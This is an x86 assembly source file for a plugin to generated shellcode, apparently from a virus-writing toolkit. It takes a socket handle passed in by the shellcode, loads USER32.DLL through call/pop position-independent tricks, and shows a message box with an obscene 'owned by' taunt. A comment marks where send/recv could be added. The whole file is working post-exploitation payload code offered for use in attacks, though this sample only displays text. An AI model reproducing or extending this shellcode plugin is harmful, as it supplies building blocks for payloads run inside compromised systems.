
; MsgBox + [text]
; example of snippet's text argument usage
; to be used as a loadable plugin with shc1.03+ generated shellcodes

include                 vxl.ash

                        p586
                        model   flat
                        locals  __

                        .code

                        db      '$START$'

                        mov     esi, [esp+4]    ; socket handle
                        ; you can do send/recv here

                        nop
                        nop

                        call    pop_1
                        db      'USER32.DLL',0
pop_1:                  callK32 LoadLibraryA
                        xchg    ebx, eax        ; ebx=base

                        push    0
                        jmp     call_pop_2
                        ; [text]
pop_2:                  call    pop_3
                        db      'owned by satanic motherfuckers',0
pop_3:                  push    0
                        callANY MessageBoxA     ; uses: ebx=dll base

                        nop
                        nop
back2shellcode:
                        retn

include                 vxl.asi

call_pop_2:             call    pop_2
                        ; [text]+\0 is appended here

                        db      '$END$'

                        end
